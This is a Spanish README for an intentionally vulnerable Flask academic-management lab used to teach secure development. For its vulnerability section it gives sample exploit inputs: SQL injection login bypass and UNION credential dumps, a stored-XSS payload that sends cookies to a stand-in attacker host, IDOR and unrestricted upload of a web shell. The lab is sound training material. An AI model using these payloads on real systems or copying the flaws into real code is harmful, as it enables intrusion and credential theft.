# Laboratorio S-SDLC

Aplicación Flask **intencionalmente vulnerable** para prácticas de Seguridad en el Ciclo de Vida de Desarrollo de Software (S-SDLC).

> **ADVERTENCIA:** Esta aplicación contiene vulnerabilidades de seguridad deliberadas. Úsala **únicamente** en un entorno local y aislado, con fines educativos. No la despliegues en producción ni en redes públicas.

---

## Tabla de contenidos

- [Descripción](#descripción)
- [Requisitos](#requisitos)
- [Puesta en marcha](#puesta-en-marcha)
- [Credenciales de prueba](#credenciales-de-prueba)
- [Estructura del proyecto](#estructura-del-proyecto)
- [Rutas disponibles](#rutas-disponibles)
- [Vulnerabilidades incluidas](#vulnerabilidades-incluidas)
  - [1. Inyección SQL (SQLi)](#1-inyección-sql-sqli)
  - [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
  - [3. Control de acceso roto (IDOR)](#3-control-de-acceso-roto-idor)
  - [4. Carga de archivos sin restricción](#4-carga-de-archivos-sin-restricción)
- [Notas adicionales](#notas-adicionales)

---

## Descripción

Sistema de gestión académica con funcionalidades básicas (login, búsqueda de estudiantes, perfiles, calificaciones y carga de archivos) que implementa **4 vulnerabilidades clásicas** de OWASP para que los estudiantes practiquen identificación, explotación y mitigación.

---

## Requisitos

- [uv](https://docs.astral.sh/uv/) — gestor de paquetes y entornos virtuales
- Python 3.12+ (uv lo instala/gestiona automáticamente)

---

## Puesta en marcha

```bash
# Instalar dependencias y crear el entorno virtual
uv sync

# Ejecutar la aplicación (crea academia.db en el primer arranque)
uv run app.py
```

La aplicación queda disponible en <http://127.0.0.1:5000>.

---

## Credenciales de prueba

| Usuario    | Contraseña | Rol         |
|------------|------------|-------------|
| `admin`    | `admin123` | admin       |
| `profesor` | `clave456` | docente     |
| `estudiante` | `1234`   | estudiante  |

---

## Estructura del proyecto

```
├── app.py              # Rutas y lógica de la aplicación (vulnerable)
├── database.py         # Creación y carga de datos en SQLite
├── templates/          # Plantillas Jinja2
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── buscar.html
│   ├── perfil.html
│   ├── editar_biografia.html
│   ├── editar_nota.html
│   └── subir.html
├── static/             # Hojas de estilo
│   └── style.css
├── uploads/            # Archivos subidos por los usuarios
├── pyproject.toml      # Proyecto y dependencias (uv)
├── uv.lock             # Versiones bloqueadas
└── README.md
```

---

## Rutas disponibles

| Método | Ruta                      | Descripción                        |
|--------|---------------------------|------------------------------------|
| GET    | `/`                       | Página de inicio                   |
| GET/POST | `/login`                | Inicio de sesión (vulnerable SQLi) |
| GET    | `/logout`                 | Cerrar sesión                     |
| GET    | `/buscar?q=<término>`     | Buscador de estudiantes (SQLi)     |
| GET    | `/perfil/<id>`            | Perfil de estudiante (XSS)         |
| GET/POST | `/perfil/<id>/editar`   | Editar biografía (fuente XSS)      |
| GET/POST | `/nota/editar/<id>`     | Editar calificación (IDOR)         |
| GET/POST | `/subir`                | Carga de archivos (sin restricción)|

---

## Vulnerabilidades incluidas

### 1. Inyección SQL (SQLi)

**Ubicación:** `/login` y `/buscar`

Las consultas SQL construyen la cadena concatenando directamente la entrada del usuario sin sanitizar ni usar consultas parametrizadas.

**Ejemplo de explotación en `/login`:**

```
Usuario: admin' --
Contraseña: (cualquiera)
```

Esto comenta el resto de la consulta y permite autenticarse como `admin` sin conocer la contraseña.

**Ejemplo de explotación en `/buscar` (UNION-based):**

```sql
' UNION SELECT id, username, password, rol FROM usuarios --
```

Extrae las credenciales de todos los usuarios de la base de datos.

---

### 2. Cross-Site Scripting (XSS)

**Ubicación:** `/perfil/<id>`

La biografía del estudiante se guarda sin sanear y se renderiza en la plantilla con el filtro `| safe` de Jinja2, desactivando el autoescape. Esto permite **XSS almacenado**.

**Ejemplo de explotación:**

Editar la biografía de un estudiante con:

```html
<script>alert('XSS')</script>
```

O más malicioso:

```html
<script>fetch('https://atacante.com/steal?cookie='+document.cookie)</script>
```

Cualquier usuario que visite el perfil ejecutará el script.

---

### 3. Control de acceso roto (IDOR)

**Ubicación:** `/nota/editar/<id>`

La ruta no verifica si el usuario ha iniciado sesión, ni su rol, ni si la calificación le pertenece. Cualquier persona puede modificar cualquier calificación cambiando el ID en la URL.

**Ejemplo de explotación:**

```
GET /nota/editar/1   # modificar la nota con ID 1
GET /nota/editar/2   # modificar la nota con ID 2 (de otro estudiante)
```

---

### 4. Carga de archivos sin restricción

**Ubicación:** `/subir`

El formulario de carga acepta **cualquier** tipo de archivo sin validar extensión, contenido ni tamaño. Un atacante puede subir scripts ejecutables (`.py`, `.php`, `.html` con JavaScript, etc.).

**Ejemplo de explotación:**

Subir un archivo `shell.php` con código PHP malicioso o un `.html` con JavaScript que se ejecute cuando otro usuario lo abra.

---

## Notas adicionales

- **Contraseñas en texto plano:** La base de datos almacena las contraseñas sin hash (mala práctica deliberada para demostrar en clase).
- **Clave de sesión débil:** `app.secret_key` es una cadena fija e insegura.
- **Modo debug activado:** `debug=True` expone la consola de depuración de Werkzeug (útil para el laboratorio, peligroso en producción).
- **Base de datos SQLite:** Se crea automáticamente como `academia.db` en el primer arranque. Elimínala para reiniciar los datos de ejemplo.
